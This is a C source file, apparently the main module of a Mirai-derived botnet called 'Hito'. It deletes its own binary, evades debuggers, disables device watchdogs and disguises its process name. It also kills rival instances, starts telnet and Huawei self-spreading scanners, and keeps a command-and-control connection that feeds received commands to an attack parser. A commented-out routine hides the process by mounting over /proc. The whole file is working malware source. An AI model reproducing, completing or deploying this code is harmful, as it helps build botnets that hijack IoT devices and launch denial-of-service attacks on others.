#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "util.h"
#ifdef KILLER
#include "killer.h"
#endif
#ifdef MIRAI_TELNET
#include "telnet.h"
#endif

#define SINGLE_INSTANCE_PORT 34561

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("[hito] got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif
/* void hidepid()
{
    #ifdef DEBUG
    printf("[hide] i am in pid %d\n", (int) getpid());
    #endif
         #ifdef DEBUG
        printf("[main] hiding pids now goodbye\n");
        #endif

        char* hidepid_cmd = "mount -o bind /tmp /proc/%s";
        char* hidepid = (char*)malloc(util_strlen(hidepid_cmd) + 16);
        sprintf(hidepid,hidepid_cmd, (int)getpid());
        system(hidepid); 
}
*/
int main(int argc, char **args)
{

    #ifdef KILLER
    main_pid = getpid();
    #endif
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;
        int i = 0;
        #ifdef DEBUG
        printf("[main] i am in pid %d\n", (int) getpid());
        #endif

        // delete ourselfs
        unlink(args[0]);

#ifndef DEBUG
        sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
#endif

    int wfd;

    // prevent watchdog from rebooting the device and making it die on cnc >->
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/FTWDT101_watchdog", 2)) != -1 ||
        (wfd = open("/etc/default/watchdog", 2)) != -1 ||
        (wfd = open("/dev/watchdog0", 2)) != -1 ||
        (wfd = open("/sbin/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir("/");

    #ifdef DEBUG
        printf("[debug]: Hito successfully launched in debug!\n");

        sleep(1);
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();

    anti_gdb_entry(0);

    rand_init();

    ensure_single_instance();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

    // * calling killer *

    #ifdef KILLER
    hito_killer();
    #endif

    // * calling telnet scanner *

    #ifdef MIRAI_TELNET
    DBG_PRINTF("[selfrep] telnet scanner initialized");
    scanner_init();
    #endif

    // * calling huawei scanner *
    
    #ifdef HUAWEI
    DBG_PRINTF("[selfrep] huawei scanner initialized");
    huawei_init();
    #endif

    attack_init();
#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
/*  sleep(10);
    hidepid();         */



    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif

#ifdef MIRAI_TELNET
            scanner_kill();
#endif

            #ifdef KILLER
            killer_kill();
            #endif
            attack_kill_all();
            exit(0);
        }
        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if(len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    
    resolv_entries_free(entries);
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #endif
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}
static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[AntiDupe] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[AntiDupe] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        #ifdef KILLER
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        #endif
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[AntiDupe] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            #ifdef KILLER
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            #endif
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[AntiDupe] We are the only process on this system!\n");
#endif
    }
}
